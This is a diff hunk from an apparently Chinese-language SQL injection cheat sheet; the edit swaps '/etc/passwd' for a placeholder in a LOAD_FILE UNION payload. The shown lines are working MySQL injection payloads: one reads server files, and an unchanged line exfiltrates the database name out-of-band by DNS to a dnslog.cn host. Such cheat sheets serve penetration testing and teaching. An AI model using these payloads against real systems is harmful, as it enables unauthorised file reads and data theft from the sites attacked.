@@ -184,7 +184,7 @@
 
 ```sql
 -- 读取文件 (需 FILE 权限)
-?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--
+?id=-1 UNION SELECT 1,LOAD_FILE('<sensitive-file>'),3,4,5--
 
 -- DNS OOB 带外注入
 ?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog.cn\\a')))--
